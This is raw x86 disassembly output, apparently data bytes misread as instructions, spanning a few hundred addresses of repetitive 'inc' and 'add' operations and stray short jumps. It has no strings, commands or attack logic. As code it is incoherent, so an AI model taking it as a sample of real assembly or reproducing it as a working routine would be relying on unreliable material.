  43b8fe:	inc    DWORD PTR [eax]
  43b900:	add    BYTE PTR [edx],ch
  43b902:	inc    DWORD PTR [eax]
  43b904:	add    BYTE PTR [edi],dh
  43b906:	inc    DWORD PTR [eax]
  43b908:	add    BYTE PTR [eax],dh
  43b90a:	inc    DWORD PTR [eax]
  43b90c:	add    BYTE PTR [esi],ch
  43b90e:	inc    DWORD PTR [eax]
  43b910:	add    BYTE PTR [edx],dh
  43b912:	inc    DWORD PTR [eax]
  43b914:	add    BYTE PTR [edi+edi*8],ch
  43b917:	add    BYTE PTR [eax],al
  43b919:	sub    bh,bh
  43b91b:	add    BYTE PTR [eax],al
  43b91d:	xor    edi,edi
  43b91f:	add    BYTE PTR [eax],al
  43b921:	sub    bh,bh
  43b923:	add    BYTE PTR [eax],al
  43b925:	and    bh,bh
  43b927:	add    BYTE PTR [eax],al
  43b929:	daa    
  43b92a:	inc    DWORD PTR [eax]
  43b92c:	add    BYTE PTR [edi+edi*8],ch
  43b92f:	add    BYTE PTR [eax],al
  43b931:	sub    edi,edi
  43b933:	add    BYTE PTR [eax],al
  43b935:	sub    bh,bh
  43b937:	add    BYTE PTR [eax],al
  43b939:	sub    edi,edi
  43b93b:	add    BYTE PTR [eax],al
  43b93d:	sub    bh,bh
  43b93f:	add    BYTE PTR [eax],al
  43b941:	xor    bh,bh
  43b943:	add    BYTE PTR [eax],al
  43b945:	inc    DWORD PTR es:[eax]
  43b948:	add    BYTE PTR [ebx],ch
  43b94a:	inc    DWORD PTR [eax]
  43b94c:	add    BYTE PTR [edi],ah
  43b94e:	inc    DWORD PTR [eax]
  43b950:	add    BYTE PTR [ecx],ah
  43b952:	inc    DWORD PTR [eax]
  43b954:	add    BYTE PTR [eax],ch
  43b956:	inc    DWORD PTR [eax]
  43b958:	add    BYTE PTR [ecx],ch
  43b95a:	inc    DWORD PTR [eax]
  43b95c:	add    BYTE PTR [edx],ah
  43b95e:	inc    DWORD PTR [eax]
  43b960:	add    BYTE PTR [esi],bl
  43b962:	inc    DWORD PTR [eax]
  43b964:	add    BYTE PTR [edi+edi*8],bl
  43b967:	add    BYTE PTR [eax],al
  43b969:	xor    bh,bh
  43b96b:	add    BYTE PTR [eax],al
  43b96d:	adc    eax,0x240000ff
  43b972:	inc    DWORD PTR [eax]
  43b974:	add    BYTE PTR [ebx],ch
  43b976:	inc    DWORD PTR [eax]
  43b978:	add    BYTE PTR [edx],ah
  43b97a:	inc    DWORD PTR [eax]
  43b97c:	add    BYTE PTR [ecx],ch
  43b97e:	inc    DWORD PTR [eax]
  43b980:	add    BYTE PTR [esi],bl
  43b982:	inc    DWORD PTR [eax]
  43b984:	add    BYTE PTR [edi+edi*8],bl
  43b987:	add    BYTE PTR [eax],al
  43b989:	inc    DWORD PTR es:[eax]
  43b98c:	add    BYTE PTR [eax],ah
  43b98e:	inc    DWORD PTR [eax]
  43b990:	add    BYTE PTR [edi+edi*8],ch
  43b993:	add    BYTE PTR [eax],al
  43b995:	adc    al,0xff
  43b997:	add    BYTE PTR [eax],al
  43b999:	inc    DWORD PTR es:[eax]
  43b99c:	add    BYTE PTR [esi],ah
  43b99e:	inc    DWORD PTR [eax]
  43b9a0:	add    BYTE PTR [ebx],ch
  43b9a2:	inc    DWORD PTR [eax]
  43b9a4:	add    BYTE PTR [eax],bh
  43b9a6:	inc    DWORD PTR [eax]
  43b9a8:	add    BYTE PTR [edi],dh
  43b9aa:	inc    DWORD PTR [eax]
  43b9ac:	add    BYTE PTR [edi+edi*8+0x0],al
  43b9b0:	add    BYTE PTR [ecx-0x1],al
  43b9b3:	add    BYTE PTR [eax],al
  43b9b5:	dec    eax
  43b9b6:	inc    DWORD PTR [eax]
  43b9b8:	add    BYTE PTR [edi-0x1],al
  43b9bb:	add    BYTE PTR [eax],al
  43b9bd:	inc    edi
  43b9be:	inc    DWORD PTR [eax]
  43b9c0:	add    BYTE PTR [ebx-0x1],dl
  43b9c3:	add    BYTE PTR [eax],al
  43b9c5:	cmp    edi,edi
  43b9c7:	add    BYTE PTR [eax],al
  43b9c9:	xor    edi,edi
  43b9cb:	add    BYTE PTR [eax],al
  43b9cd:	inc    ebp
  43b9ce:	inc    DWORD PTR [eax]
  43b9d0:	add    BYTE PTR [ebx-0x1],al
  43b9d3:	add    BYTE PTR [eax],al
  43b9d5:	sub    bh,bh
  43b9d7:	add    BYTE PTR [eax],al
  43b9d9:	sbb    edi,edi
  43b9db:	add    BYTE PTR [eax],al
  43b9dd:	xor    bh,bh
  43b9df:	add    BYTE PTR [eax],al
  43b9e1:	das    
  43b9e2:	inc    DWORD PTR [eax]
  43b9e4:	add    BYTE PTR [ebx-0x1],al
  43b9e7:	add    BYTE PTR [eax],al
  43b9e9:	cmp    eax,0x340000ff
  43b9ee:	inc    DWORD PTR [eax]
  43b9f0:	add    BYTE PTR [edx],bh
  43b9f2:	inc    DWORD PTR [eax]
  43b9f4:	add    BYTE PTR [edx-0x1],al
  43b9f7:	add    BYTE PTR [eax],al
  43b9f9:	inc    DWORD PTR ss:[eax]
  43b9fc:	add    BYTE PTR [edi],dh
  43b9fe:	inc    DWORD PTR [eax]
  43ba00:	add    BYTE PTR [edx-0x1],al
  43ba03:	add    BYTE PTR [eax],al
  43ba05:	aaa    
  43ba06:	inc    DWORD PTR [eax]
  43ba08:	add    BYTE PTR [edi+edi*8],bh
  43ba0b:	add    BYTE PTR [eax],al
  43ba0d:	dec    ecx
  43ba0e:	inc    DWORD PTR [eax]
  43ba10:	add    BYTE PTR [edi-0x1],al
  43ba13:	add    BYTE PTR [eax],al
  43ba15:	dec    eax
  43ba16:	inc    DWORD PTR [eax]
  43ba18:	add    BYTE PTR [ecx-0x1],cl
  43ba1b:	add    BYTE PTR [eax],al
  43ba1d:	xor    eax,0x3b0000ff
  43ba22:	inc    DWORD PTR [eax]
  43ba24:	add    BYTE PTR [edx-0x1],al
  43ba27:	add    BYTE PTR [eax],al
  43ba29:	xor    bh,bh
  43ba2b:	add    BYTE PTR [eax],al
  43ba2d:	sub    edi,edi
  43ba2f:	add    BYTE PTR [eax],al
  43ba31:	daa    
  43ba32:	inc    DWORD PTR [eax]
  43ba34:	add    BYTE PTR [edi+edi*8],dh
  43ba37:	add    BYTE PTR [eax],al
  43ba39:	inc    esi
  43ba3a:	inc    DWORD PTR [eax]
  43ba3c:	add    BYTE PTR ds:0x330000ff,bh
  43ba42:	inc    DWORD PTR [eax]
  43ba44:	add    BYTE PTR [edi+edi*8],ch
  43ba47:	add    BYTE PTR [eax],al
  43ba49:	and    bh,bh
  43ba4b:	add    BYTE PTR [eax],al
  43ba4d:	dec    esp
  43ba4e:	inc    DWORD PTR [eax]
  43ba50:	add    BYTE PTR [edi+edi*8+0x0],al
  43ba54:	add    BYTE PTR [esi-0x1],al
  43ba57:	add    BYTE PTR [eax],al
  43ba59:	dec    ebp
  43ba5a:	inc    DWORD PTR [eax]
  43ba5c:	add    BYTE PTR [esi],bh
  43ba5e:	inc    DWORD PTR [eax]
  43ba60:	add    BYTE PTR [ebx-0x1],al
  43ba63:	add    BYTE PTR [eax],al
  43ba65:	cmp    bh,bh
  43ba67:	add    BYTE PTR [eax],al
  43ba69:	inc    edi
  43ba6a:	inc    DWORD PTR [eax]
  43ba6c:	add    BYTE PTR [esi-0x1],al
  43ba6f:	add    BYTE PTR [eax],al
  43ba71:	dec    edx
  43ba72:	inc    DWORD PTR [eax]
  43ba74:	add    BYTE PTR [esi-0x1],al
  43ba77:	add    BYTE PTR [eax],al
  43ba79:	inc    edx
  43ba7a:	inc    DWORD PTR [eax]
  43ba7c:	add    BYTE PTR [ecx-0x1],dl
  43ba7f:	add    BYTE PTR [eax],al
  43ba81:	inc    ebp
  43ba82:	inc    DWORD PTR [eax]
  43ba84:	add    BYTE PTR [esi-0x1],cl
  43ba87:	add    BYTE PTR [eax],al
  43ba89:	dec    ebp
  43ba8a:	inc    DWORD PTR [eax]
  43ba8c:	add    BYTE PTR [ecx-0x1],dl
  43ba8f:	add    BYTE PTR [eax],al
  43ba91:	push   edx
  43ba92:	inc    DWORD PTR [eax]
  43ba94:	add    BYTE PTR [ebx],bh
  43ba96:	inc    DWORD PTR [eax]
  43ba98:	add    BYTE PTR [edi-0x1],al
  43ba9b:	add    BYTE PTR [eax],al
  43ba9d:	cmp    eax,0x3a0000ff
  43baa2:	inc    DWORD PTR [eax]
  43baa4:	add    BYTE PTR [ebx],dh
  43baa6:	inc    DWORD PTR [eax]
  43baa8:	add    BYTE PTR [edi],bh
  43baaa:	inc    DWORD PTR [eax]
  43baac:	add    BYTE PTR [esi],bh
  43baae:	inc    DWORD PTR [eax]
  43bab0:	add    BYTE PTR [ebp-0x1],dl
  43bab3:	add    BYTE PTR [eax],al
  43bab5:	inc    edi
  43bab6:	inc    DWORD PTR [eax]
  43bab8:	add    BYTE PTR [edx],dh
  43baba:	inc    DWORD PTR [eax]
  43babc:	add    BYTE PTR [ebx],bh
  43babe:	inc    DWORD PTR [eax]
  43bac0:	add    BYTE PTR [ecx-0x1],cl
  43bac3:	add    BYTE PTR [eax],al
  43bac5:	inc    eax
  43bac6:	inc    DWORD PTR [eax]
  43bac8:	add    BYTE PTR [ebx],bh
  43baca:	inc    DWORD PTR [eax]
  43bacc:	add    BYTE PTR [ebx],bh
  43bace:	inc    DWORD PTR [eax]
  43bad0:	add    BYTE PTR [edi],bh
  43bad2:	inc    DWORD PTR [eax]
  43bad4:	add    BYTE PTR ds:0x470000ff,bh
  43bada:	inc    DWORD PTR [eax]
  43badc:	add    BYTE PTR ds:0x290000ff,bh
  43bae2:	inc    DWORD PTR [eax]
  43bae4:	add    BYTE PTR [ebx],dh
  43bae6:	inc    DWORD PTR [eax]
  43bae8:	add    BYTE PTR [esi],dh
  43baea:	inc    DWORD PTR [eax]
  43baec:	add    BYTE PTR [eax],dh
  43baee:	inc    DWORD PTR [eax]
  43baf0:	add    BYTE PTR ds:0x230000ff,ah
  43baf6:	inc    DWORD PTR [eax]
  43baf8:	add    BYTE PTR [ebx],dh
  43bafa:	inc    DWORD PTR [eax]
  43bafc:	add    BYTE PTR ds:0x320000ff,ch
  43bb02:	inc    DWORD PTR [eax]
  43bb04:	add    BYTE PTR [ebx],dh
  43bb06:	inc    DWORD PTR [eax]
  43bb08:	add    BYTE PTR ds:0x2c0000ff,dh
  43bb0e:	inc    DWORD PTR [eax]
  43bb10:	add    BYTE PTR [ebx],ch
  43bb12:	inc    DWORD PTR [eax]
  43bb14:	add    BYTE PTR [eax],dh
  43bb16:	inc    DWORD PTR [eax]
  43bb18:	add    BYTE PTR [esi],ch
  43bb1a:	inc    DWORD PTR [eax]
  43bb1c:	add    BYTE PTR [esi],dh
  43bb1e:	inc    DWORD PTR [eax]
  43bb20:	add    BYTE PTR [ebx],ah
  43bb22:	inc    DWORD PTR [eax]
  43bb24:	add    BYTE PTR [edx],ch
  43bb26:	inc    DWORD PTR [eax]
  43bb28:	add    BYTE PTR [edi],ch
  43bb2a:	inc    DWORD PTR [eax]
  43bb2c:	add    BYTE PTR ds:0x210000ff,ah
  43bb32:	inc    DWORD PTR [eax]
  43bb34:	add    BYTE PTR ds:0x320000ff,ah
  43bb3a:	inc    DWORD PTR [eax]
  43bb3c:	add    BYTE PTR [ebx],bl
  43bb3e:	inc    DWORD PTR [eax]
  43bb40:	add    BYTE PTR [eax],ch
  43bb42:	inc    DWORD PTR [eax]
  43bb44:	add    BYTE PTR [ebx],bl
  43bb46:	inc    DWORD PTR [eax]
  43bb48:	add    BYTE PTR [esi],bl
  43bb4a:	inc    DWORD PTR [eax]
  43bb4c:	add    BYTE PTR [esi],bl
  43bb4e:	inc    DWORD PTR [eax]
  43bb50:	add    BYTE PTR [eax],ah
  43bb52:	inc    DWORD PTR [eax]
  43bb54:	add    BYTE PTR ds:0x280000ff,ah
  43bb5a:	inc    DWORD PTR [eax]
  43bb5c:	add    BYTE PTR ds:0x2b0000ff,ah
  43bb62:	inc    DWORD PTR [eax]
  43bb64:	add    BYTE PTR [esi],ah
  43bb66:	inc    DWORD PTR [eax]
  43bb68:	add    BYTE PTR [eax],ch
  43bb6a:	inc    DWORD PTR [eax]
  43bb6c:	add    BYTE PTR [ebx],ch
  43bb6e:	inc    DWORD PTR [eax]
  43bb70:	add    BYTE PTR [ebx],ah
  43bb72:	inc    DWORD PTR [eax]
  43bb74:	add    BYTE PTR ds:0x350000ff,ah
  43bb7a:	inc    DWORD PTR [eax]
  43bb7c:	add    BYTE PTR [edi+edi*8],ah
  43bb7f:	add    BYTE PTR [eax],al
  43bb81:	adc    edi,edi
  43bb83:	add    BYTE PTR [eax],al
  43bb85:	sbb    bh,bh
  43bb87:	add    BYTE PTR [eax],al
  43bb89:	sub    al,0xff
  43bb8b:	add    BYTE PTR [eax],al
  43bb8d:	xor    bh,bh
  43bb8f:	add    BYTE PTR [eax],al
  43bb91:	xor    bh,bh
  43bb93:	add    BYTE PTR [eax],al
  43bb95:	sub    al,0xff
  43bb97:	add    BYTE PTR [eax],al
  43bb99:	inc    DWORD PTR es:[eax]
  43bb9c:	add    BYTE PTR [esi],ch
  43bb9e:	inc    DWORD PTR [eax]
  43bba0:	add    BYTE PTR ds:0x380000ff,dh
  43bba6:	inc    DWORD PTR [eax]
  43bba8:	add    BYTE PTR ds:0x450000ff,dh
  43bbae:	inc    DWORD PTR [eax]
  43bbb0:	add    BYTE PTR [ecx],bh
  43bbb2:	inc    DWORD PTR [eax]
  43bbb4:	add    BYTE PTR [edx],bh
  43bbb6:	inc    DWORD PTR [eax]
  43bbb8:	add    BYTE PTR ds:0x310000ff,dh
  43bbbe:	inc    DWORD PTR [eax]
  43bbc0:	add    BYTE PTR [eax],ch
  43bbc2:	inc    DWORD PTR [eax]
  43bbc4:	add    BYTE PTR [ebx],bh
  43bbc6:	inc    DWORD PTR [eax]
  43bbc8:	add    BYTE PTR [edi+edi*8+0x0],al
  43bbcc:	add    BYTE PTR [esi],bh
  43bbce:	inc    DWORD PTR [eax]
  43bbd0:	add    BYTE PTR [eax-0x1],al
  43bbd3:	add    BYTE PTR [eax],al
  43bbd5:	inc    edi
  43bbd6:	inc    DWORD PTR [eax]
  43bbd8:	add    BYTE PTR [edi+edi*8+0x0],al
  43bbdc:	add    BYTE PTR [ebx],bh
  43bbde:	inc    DWORD PTR [eax]
  43bbe0:	add    BYTE PTR [edx],bh
  43bbe2:	inc    DWORD PTR [eax]
  43bbe4:	add    BYTE PTR [ecx-0x1],al
  43bbe7:	add    BYTE PTR [eax],al
  43bbe9:	inc    ecx
  43bbea:	inc    DWORD PTR [eax]
  43bbec:	add    BYTE PTR [ebx],ch
  43bbee:	inc    DWORD PTR [eax]
  43bbf0:	add    BYTE PTR [eax],dh
  43bbf2:	inc    DWORD PTR [eax]
  43bbf4:	add    BYTE PTR [edx],bh
  43bbf6:	inc    DWORD PTR [eax]
  43bbf8:	add    BYTE PTR [ecx],dh
  43bbfa:	inc    DWORD PTR [eax]
  43bbfc:	add    BYTE PTR [ebp-0x1],al
  43bbff:	add    BYTE PTR [eax],al
  43bc01:	cmp    al,0xff
  43bc03:	add    BYTE PTR [eax],al
  43bc05:	xor    edi,edi
  43bc07:	add    BYTE PTR [eax],al
  43bc09:	dec    edx
  43bc0a:	inc    DWORD PTR [eax]
  43bc0c:	add    BYTE PTR [ebx],bh
  43bc0e:	inc    DWORD PTR [eax]
  43bc10:	add    BYTE PTR ds:0x2f0000ff,ch
  43bc16:	inc    DWORD PTR [eax]
  43bc18:	add    BYTE PTR [eax],bh
  43bc1a:	inc    DWORD PTR [eax]
  43bc1c:	add    BYTE PTR [esi-0x1],al
  43bc1f:	add    BYTE PTR [eax],al
  43bc21:	dec    ebp
  43bc22:	inc    DWORD PTR [eax]
  43bc24:	add    BYTE PTR [ecx-0x1],bl
  43bc27:	add    BYTE PTR [eax],al
  43bc29:	dec    edi
  43bc2a:	inc    DWORD PTR [eax]
  43bc2c:	add    BYTE PTR [ebx-0x1],dl
  43bc2f:	add    BYTE PTR [eax],al
  43bc31:	inc    esi
  43bc32:	inc    DWORD PTR [eax]
  43bc34:	add    BYTE PTR [edi+edi*8],bh
  43bc37:	add    BYTE PTR [eax],al
  43bc39:	daa    
  43bc3a:	inc    DWORD PTR [eax]
  43bc3c:	add    BYTE PTR [eax],ch
  43bc3e:	inc    DWORD PTR [eax]
  43bc40:	add    BYTE PTR [ecx-0x1],al
  43bc43:	add    BYTE PTR [eax],al
  43bc45:	inc    ebp
  43bc46:	inc    DWORD PTR [eax]
  43bc48:	add    BYTE PTR [edi],bh
  43bc4a:	inc    DWORD PTR [eax]
  43bc4c:	add    BYTE PTR [edi+edi*8+0x0],al
  43bc50:	add    BYTE PTR [edx-0x1],cl
  43bc53:	add    BYTE PTR [eax],al
  43bc55:	dec    edx
  43bc56:	inc    DWORD PTR [eax]
  43bc58:	add    BYTE PTR [edx-0x1],cl
  43bc5b:	add    BYTE PTR [eax],al
  43bc5d:	pop    ebx
  43bc5e:	inc    DWORD PTR [eax]
  43bc60:	add    BYTE PTR [edi-0x1],al
  43bc63:	add    BYTE PTR [eax],al
  43bc65:	inc    ecx
  43bc66:	inc    DWORD PTR [eax]
  43bc68:	add    BYTE PTR [edi+edi*8+0x0],bl
  43bc6c:	add    BYTE PTR [edx-0x1],bl
  43bc6f:	add    BYTE PTR [eax],al
  43bc71:	push   esp
  43bc72:	inc    DWORD PTR [eax]
  43bc74:	add    BYTE PTR [edx-0x1],ah
  43bc77:	add    BYTE PTR [eax],al
  43bc79:	pop    ebx
  43bc7a:	inc    DWORD PTR [eax]
  43bc7c:	add    BYTE PTR [edx-0x1],ch
  43bc7f:	add    BYTE PTR [eax],al
  43bc81:	push   ebx
  43bc82:	inc    DWORD PTR [eax]
  43bc84:	add    BYTE PTR [esi-0x1],bl
  43bc87:	add    BYTE PTR [eax],al
  43bc89:	pop    eax
  43bc8a:	inc    DWORD PTR [eax]
  43bc8c:	add    BYTE PTR [ebx-0x1],bl
  43bc8f:	add    BYTE PTR [eax],al
  43bc91:	pop    ecx
  43bc92:	inc    DWORD PTR [eax]
  43bc94:	add    BYTE PTR [ecx-0x1],bl
  43bc97:	add    BYTE PTR [eax],al
  43bc99:	pop    eax
  43bc9a:	inc    DWORD PTR [eax]
  43bc9c:	add    BYTE PTR [ecx-0x1],cl
  43bc9f:	add    BYTE PTR [eax],al
  43bca1:	dec    ebx
  43bca2:	inc    DWORD PTR [eax]
  43bca4:	add    BYTE PTR [edx],bh
  43bca6:	inc    DWORD PTR [eax]
  43bca8:	add    BYTE PTR [edi+edi*8+0x0],cl
  43bcac:	add    BYTE PTR [ecx-0x1],dl
  43bcaf:	add    BYTE PTR [eax],al
  43bcb1:	inc    eax
  43bcb2:	inc    DWORD PTR [eax]
  43bcb4:	add    BYTE PTR [ecx],bh
  43bcb6:	inc    DWORD PTR [eax]
  43bcb8:	add    BYTE PTR [esi-0x1],al
  43bcbb:	add    BYTE PTR [eax],al
  43bcbd:	dec    edx
  43bcbe:	inc    DWORD PTR [eax]
  43bcc0:	add    BYTE PTR [ebp-0x1],dl
  43bcc3:	add    BYTE PTR [eax],al
  43bcc5:	dec    ebp
  43bcc6:	inc    DWORD PTR [eax]
  43bcc8:	add    BYTE PTR [edi-0x1],cl
  43bccb:	add    BYTE PTR [eax],al
  43bccd:	push   eax
  43bcce:	inc    DWORD PTR [eax]
  43bcd0:	add    BYTE PTR [ecx-0x1],cl
  43bcd3:	add    BYTE PTR [eax],al
  43bcd5:	push   ebx
  43bcd6:	inc    DWORD PTR [eax]
  43bcd8:	add    BYTE PTR [eax-0x1],bl
  43bcdb:	add    BYTE PTR [eax],al
  43bcdd:	dec    ebp
  43bcde:	inc    DWORD PTR [eax]
  43bce0:	add    BYTE PTR [esi],bh
  43bce2:	inc    DWORD PTR [eax]
  43bce4:	add    BYTE PTR [ebp-0x1],al
  43bce7:	add    BYTE PTR [eax],al
  43bce9:	xor    al,0xff
  43bceb:	add    BYTE PTR [eax],al
  43bced:	aaa    
  43bcee:	inc    DWORD PTR [eax]
  43bcf0:	add    BYTE PTR [esi],dh
  43bcf2:	inc    DWORD PTR [eax]
  43bcf4:	add    BYTE PTR [ecx],ch
  43bcf6:	inc    DWORD PTR [eax]
  43bcf8:	add    BYTE PTR [edi+edi*8],ah
  43bcfb:	add    BYTE PTR [eax],al
  43bcfd:	inc    DWORD PTR es:[eax]
  43bd00:	add    BYTE PTR [ecx],ah
  43bd02:	inc    DWORD PTR [eax]
  43bd04:	add    BYTE PTR [eax],ch
  43bd06:	inc    DWORD PTR [eax]
  43bd08:	add    BYTE PTR [edi],ah
  43bd0a:	inc    DWORD PTR [eax]
  43bd0c:	add    BYTE PTR [edi+edi*8],dl
  43bd0f:	add    BYTE PTR [eax],al
  43bd11:	sub    bh,bh
  43bd13:	add    BYTE PTR [eax],al
  43bd15:	sub    eax,0x280000ff
  43bd1a:	inc    DWORD PTR [eax]
  43bd1c:	add    BYTE PTR [eax],ah
  43bd1e:	inc    DWORD PTR [eax]
  43bd20:	add    BYTE PTR [edx],ch
  43bd22:	inc    DWORD PTR [eax]
  43bd24:	add    BYTE PTR [esi],ch
  43bd26:	inc    DWORD PTR [eax]
  43bd28:	add    BYTE PTR [edx],ch
  43bd2a:	inc    DWORD PTR [eax]
  43bd2c:	add    BYTE PTR [esi],bl
  43bd2e:	inc    DWORD PTR [eax]
  43bd30:	add    BYTE PTR [ebx],ah
  43bd32:	inc    DWORD PTR [eax]
  43bd34:	add    BYTE PTR [edi],ah
  43bd36:	inc    DWORD PTR [eax]
  43bd38:	add    BYTE PTR [ecx],ch
  43bd3a:	inc    DWORD PTR [eax]
  43bd3c:	add    BYTE PTR [edx],ch
  43bd3e:	inc    DWORD PTR [eax]
  43bd40:	add    BYTE PTR [ecx],ah
  43bd42:	inc    DWORD PTR [eax]
  43bd44:	add    BYTE PTR [ecx],ah
  43bd46:	inc    DWORD PTR [eax]
  43bd48:	add    BYTE PTR [eax],bl
  43bd4a:	inc    DWORD PTR [eax]
  43bd4c:	add    BYTE PTR [ebx],ah
  43bd4e:	inc    DWORD PTR [eax]
  43bd50:	add    BYTE PTR [eax],ah
  43bd52:	inc    DWORD PTR [eax]
  43bd54:	add    BYTE PTR [edi],bl
  43bd56:	inc    DWORD PTR [eax]
  43bd58:	add    BYTE PTR [ecx],ah
  43bd5a:	inc    DWORD PTR [eax]
  43bd5c:	add    BYTE PTR [ecx],ah
  43bd5e:	inc    DWORD PTR [eax]
  43bd60:	add    BYTE PTR [edi+edi*8],ah
  43bd63:	add    BYTE PTR [eax],al
  43bd65:	sub    bh,bh
  43bd67:	add    BYTE PTR [eax],al
  43bd69:	and    bh,bh
  43bd6b:	add    BYTE PTR [eax],al
  43bd6d:	sub    bh,bh
  43bd6f:	add    BYTE PTR [eax],al
  43bd71:	sub    bh,bh
  43bd73:	add    BYTE PTR [eax],al
  43bd75:	inc    DWORD PTR es:[eax]
  43bd78:	add    BYTE PTR ds:0x2d0000ff,ch
  43bd7e:	inc    DWORD PTR [eax]
  43bd80:	add    BYTE PTR [ecx],bh
  43bd82:	inc    DWORD PTR [eax]
  43bd84:	add    BYTE PTR [edx],bl
  43bd86:	inc    DWORD PTR [eax]
  43bd88:	add    BYTE PTR [esi],ah
  43bd8a:	inc    DWORD PTR [eax]
  43bd8c:	add    BYTE PTR [ecx],ch
  43bd8e:	inc    DWORD PTR [eax]
  43bd90:	add    BYTE PTR [eax],dh
  43bd92:	inc    DWORD PTR [eax]
  43bd94:	add    BYTE PTR [eax-0x1],al
  43bd97:	add    BYTE PTR [eax],al
  43bd99:	xor    bh,bh
  43bd9b:	add    BYTE PTR [eax],al
  43bd9d:	xor    eax,0x4e0000ff
  43bda2:	inc    DWORD PTR [eax]
  43bda4:	add    BYTE PTR [edx-0x1],cl
  43bda7:	add    BYTE PTR [eax],al
  43bda9:	push   edi
  43bdaa:	inc    DWORD PTR [eax]
  43bdac:	add    BYTE PTR [edi+edi*8+0x0],dh
  43bdb0:	add    BYTE PTR [ecx-0x1],ah
  43bdb3:	add    BYTE PTR [eax],al
  43bdb5:	push   esi
  43bdb6:	inc    DWORD PTR [eax]
  43bdb8:	add    BYTE PTR [edi-0x1],dl
  43bdbb:	add    BYTE PTR [eax],al
  43bdbd:	aas    
  43bdbe:	inc    DWORD PTR [eax]
  43bdc0:	add    BYTE PTR [ecx],ch
  43bdc2:	inc    DWORD PTR [eax]
  43bdc4:	add    BYTE PTR [eax],ah
  43bdc6:	inc    DWORD PTR [eax]
  43bdc8:	add    BYTE PTR [ebx],ah
  43bdca:	inc    DWORD PTR [eax]
  43bdcc:	add    BYTE PTR [ebx],ch
  43bdce:	inc    DWORD PTR [eax]
  43bdd0:	add    BYTE PTR [eax],dh
  43bdd2:	inc    DWORD PTR [eax]
  43bdd4:	add    BYTE PTR [edx],ch
  43bdd6:	inc    DWORD PTR [eax]
  43bdd8:	add    BYTE PTR [edi+edi*8],bh
  43bddb:	add    BYTE PTR [eax],al
  43bddd:	inc    ecx
  43bdde:	inc    DWORD PTR [eax]
  43bde0:	add    BYTE PTR [edi+edi*8],bh
  43bde3:	add    BYTE PTR [eax],al
  43bde5:	inc    ecx
  43bde6:	inc    DWORD PTR [eax]
  43bde8:	add    BYTE PTR [edi+edi*8+0x0],cl
  43bdec:	add    BYTE PTR [edi+edi*8],dh
  43bdef:	add    BYTE PTR [eax],al
  43bdf1:	inc    ebp
  43bdf2:	inc    DWORD PTR [eax]
  43bdf4:	add    BYTE PTR [edx-0x1],al
  43bdf7:	add    BYTE PTR [eax],al
  43bdf9:	aaa    
  43bdfa:	inc    DWORD PTR [eax]
  43bdfc:	add    BYTE PTR [eax-0x1],dl
  43bdff:	add    BYTE PTR [eax],al
  43be01:	dec    esp
  43be02:	inc    DWORD PTR [eax]
  43be04:	add    BYTE PTR [ecx-0x1],cl
  43be07:	add    BYTE PTR [eax],al
  43be09:	inc    ebx
  43be0a:	inc    DWORD PTR [eax]
  43be0c:	add    BYTE PTR [ebp-0x1],cl
  43be0f:	add    BYTE PTR [eax],al
  43be11:	inc    eax
  43be12:	inc    DWORD PTR [eax]
  43be14:	add    BYTE PTR [edi+edi*8],bh
  43be17:	add    BYTE PTR [eax],al
  43be19:	dec    esp
  43be1a:	inc    DWORD PTR [eax]
  43be1c:	add    BYTE PTR [edi-0x1],cl
  43be1f:	add    BYTE PTR [eax],al
  43be21:	dec    ecx
  43be22:	inc    DWORD PTR [eax]
  43be24:	add    BYTE PTR [ecx-0x1],dl
  43be27:	add    BYTE PTR [eax],al
  43be29:	inc    ebp
  43be2a:	inc    DWORD PTR [eax]
  43be2c:	add    BYTE PTR ds:0x4b0000ff,bh
  43be32:	inc    DWORD PTR [eax]
  43be34:	add    BYTE PTR [esi-0x1],cl
  43be37:	add    BYTE PTR [eax],al
  43be39:	inc    ebx
  43be3a:	inc    DWORD PTR [eax]
  43be3c:	add    BYTE PTR [ecx-0x1],al
  43be3f:	add    BYTE PTR [eax],al
  43be41:	dec    ebx
  43be42:	inc    DWORD PTR [eax]
  43be44:	add    BYTE PTR [ecx-0x1],al
  43be47:	add    BYTE PTR [eax],al
  43be49:	xor    edi,edi
  43be4b:	add    BYTE PTR [eax],al
  43be4d:	aas    
  43be4e:	inc    DWORD PTR [eax]
  43be50:	add    BYTE PTR [edi+edi*8],bh
  43be53:	add    BYTE PTR [eax],al
  43be55:	pop    ecx
  43be56:	inc    DWORD PTR [eax]
  43be58:	add    BYTE PTR [esi-0x1],al
  43be5b:	add    BYTE PTR [eax],al
  43be5d:	pop    edi
  43be5e:	inc    DWORD PTR [eax]
  43be60:	add    BYTE PTR [ecx-0x1],ch
  43be63:	add    BYTE PTR [eax],al
  43be65:	je     0x43be66
  43be67:	add    BYTE PTR [eax],al
  43be69:	imul   edi,edi,0x0
  43be6c:	add    BYTE PTR [ebx-0x1],dh
  43be6f:	add    BYTE PTR [eax],al
  43be71:	jns    0x43be72
  43be73:	add    BYTE PTR [eax],al
  43be75:	jg     0x43be76
  43be77:	add    BYTE PTR [eax],al
  43be79:	ins    BYTE PTR es:[edi],dx
  43be7a:	inc    DWORD PTR [eax]
  43be7c:	add    BYTE PTR [ebx-0x1],dh
  43be7f:	add    BYTE PTR [eax],al
  43be81:	jo     0x43be82
  43be83:	add    BYTE PTR [eax],al
  43be85:	jp     0x43be86
  43be87:	add    BYTE PTR [eax],al
  43be89:	outs   dx,DWORD PTR ds:[esi]
  43be8a:	inc    DWORD PTR [eax]
  43be8c:	add    BYTE PTR [ecx-0x1],dh
  43be8f:	add    BYTE PTR [eax],al
  43be91:	ja     0x43be92
  43be93:	add    BYTE PTR [eax],al
  43be95:	push   0xffffffff
  43be97:	add    BYTE PTR [eax],al
  43be99:	inc    DWORD PTR [bx+si]
  43be9c:	add    BYTE PTR [edx-0x1],ch
  43be9f:	add    BYTE PTR [eax],al
  43bea1:	pop    ecx
  43bea2:	inc    DWORD PTR [eax]
  43bea4:	add    BYTE PTR [ebp-0x1],dl
  43bea7:	add    BYTE PTR [eax],al
  43bea9:	pop    eax
  43beaa:	inc    DWORD PTR [eax]
  43beac:	add    BYTE PTR [ebx-0x1],bl
  43beaf:	add    BYTE PTR [eax],al
  43beb1:	pop    eax
  43beb2:	inc    DWORD PTR [eax]
  43beb4:	add    BYTE PTR [ecx-0x1],dl
  43beb7:	add    BYTE PTR [eax],al
  43beb9:	imul   edi,edi,0xff700000
  43bebf:	add    BYTE PTR [eax],al
  43bec1:	jae    0x43bec2
  43bec3:	add    BYTE PTR [eax],al
  43bec5:	inc    WORD PTR [eax]
  43bec8:	add    BYTE PTR [ebp-0x1],ah
  43becb:	add    BYTE PTR [eax],al
  43becd:	inc    DWORD PTR [bx+si]
